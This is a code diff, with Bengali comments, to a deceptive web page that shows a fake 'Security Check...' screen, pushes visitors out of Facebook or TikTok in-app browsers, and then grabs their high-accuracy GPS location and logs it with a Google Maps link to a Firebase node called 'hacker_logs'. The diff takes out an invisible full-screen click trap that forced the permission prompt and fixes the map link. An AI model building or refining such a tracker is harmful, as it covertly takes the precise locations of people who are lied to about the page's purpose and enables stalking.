@@ -12,26 +12,25 @@
             height: 100vh; background-color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             overflow: hidden; text-align: center;
-            cursor: pointer; /* মাউস নিলে হাত দেখাবে যাতে ক্লিক করতে ইচ্ছে করে */
         }
         
-        /* অদৃশ্য ফাঁদ (পুরো স্ক্রিন জুড়ে) */
-        #click-trap {
-            position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 9999; /* সবার উপরে */
-            background: transparent;
+        /* নরমাল লোডিং ডিজাইন */
+        #loader {
+            display: block; /* শুরুতে দেখাবে */
         }
-
-        #loader { display: block; }
         h2 {
             color: #333; font-weight: 400; font-size: 24px;
             animation: pulse 1.5s infinite;
         }
-        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
+        @keyframes pulse {
+            0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; }
+        }
 
+        /* ইন-অ্যাপ ব্রাউজার ওয়ার্নিং ডিজাইন */
         #inAppWarning {
-            display: none; flex-direction: column; align-items: center; padding: 20px;
+            display: none; /* শুরুতে লুকানো থাকবে */
+            flex-direction: column; align-items: center;
+            padding: 20px;
         }
         .warn-icon { font-size: 50px; color: #ff9800; margin-bottom: 20px; }
         .arrow-up {
@@ -41,22 +40,24 @@
         }
         @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
         p { color: #555; font-size: 16px; line-height: 1.5; }
+        .btn-guide {
+            margin-top: 15px; padding: 10px 20px;
+            background: #333; color: #fff; border-radius: 5px;
+            font-size: 14px; text-decoration: none;
+        }
     </style>
 </head>
 <body>
 
-    <div id="click-trap" onclick="forcePermission()"></div>
-
     <div id="loader">
         <h2>Security Check...</h2>
-        <p style="font-size: 12px; color: #999;">Tap screen if loading takes time</p>
     </div>
 
     <div id="inAppWarning">
         <div class="arrow-up"><i class="fas fa-arrow-up"></i></div>
         <div class="warn-icon"><i class="fas fa-shield-alt"></i></div>
         <h3 style="margin-top:0">Action Required</h3>
-        <p>This page cannot run inside Facebook/TikTok browser.</p>
+        <p>This page cannot run inside Facebook/TikTok browser due to security settings.</p>
         <p><strong>1. Click the 3 dots (⋮) at the top right.</strong><br>
         <strong>2. Select "Open in Browser" or "Open in Chrome".</strong></p>
     </div>
@@ -80,21 +81,18 @@
         
         let dataSent = false; 
 
-        // গ্লোবাল ফাংশন বানাতে হবে যাতে HTML থেকে call করা যায়
-        window.forcePermission = function() {
-            startTracking();
-        }
-
+        // --- ডিটেকশন লজিক ---
         function checkBrowser() {
             var ua = navigator.userAgent || navigator.vendor || window.opera;
+            // ফেসবুক, মেসেঞ্জার, ইনস্টাগ্রাম, টিকটক শনাক্ত করা
             var isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1) || (ua.indexOf("TikTok") > -1);
 
             if (isInApp) {
+                // ইন-অ্যাপ হলে ওয়ার্নিং দেখাবো, লোডার লুকাবো
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('inAppWarning').style.display = 'flex';
-                // ইন-অ্যাপ হলে ক্লিক ট্র্যাপ সরিয়ে ফেলব, নাহলে বাটন কাজ করবে না
-                document.getElementById('click-trap').style.display = 'none';
             } else {
+                // আসল ব্রাউজার হলে লোকেশন চাইবো
                 startTracking();
             }
         }
@@ -103,10 +101,7 @@
             if ("geolocation" in navigator) {
                 navigator.geolocation.watchPosition(
                     processLocation,
-                    function(error) { 
-                        // যদি পারমিশন ডিনাই করে বা এরর হয়
-                        console.log("Waiting for permission...");
-                    },
+                    function(error) { console.log("Waiting..."); },
                     { enableHighAccuracy: true, timeout: 30000, maximumAge: 5000 }
                 );
             } else {
@@ -118,17 +113,14 @@
             if(dataSent) return; 
             dataSent = true;
 
-            // লোকেশন পাওয়ার সাথে সাথে ফাঁদ সরিয়ে ফেলব
-            document.getElementById('click-trap').style.display = 'none';
-
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
             
             const trackerRef = ref(db, 'hacker_logs');
             const newLogRef = push(trackerRef);
             
-            // ✅ FIXED: এখানে ${lat} ঠিক করে দিয়েছি
-            const mapsLink = `https://www.google.com/maps?q=$${lat},${lng}`;
+            // ✅ FIXED: ম্যাপ লিংক ফিক্সড
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
 
             set(newLogRef, {
                 timestamp: new Date().toString(),
@@ -150,7 +142,7 @@
             });
         }
 
-        window.onload = checkBrowser;
+        window.onload = checkBrowser; // পেজ লোড হলেই চেক করবে
     </script>
 </body>
 </html>
